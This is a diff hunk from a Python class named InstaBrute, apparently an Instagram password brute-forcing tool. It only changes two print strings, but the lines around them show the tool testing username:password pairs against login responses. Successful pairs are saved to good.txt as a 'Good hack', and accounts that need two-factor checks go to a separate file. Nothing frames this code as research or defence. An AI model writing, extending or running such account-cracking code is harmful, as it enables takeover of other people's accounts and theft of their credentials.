@@ -94,11 +94,11 @@ class InstaBrute(object):
             print(f'{user}:{pwd}\n----------------------------')
     
             if 'authenticated": true' in r.text:
-                print(('' + user + ':' + pwd + ' --> Good hack '))
+                print(('' + user + ':' + pwd + ' -> Good hack '))
                 with open('good.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
             elif 'two_factor_required' in r.text:   
-                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
+                print(('' + user + ':' + pwd + ' ->  Good It has to be checked '))
                 with open('results_NeedVerfiy.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
 
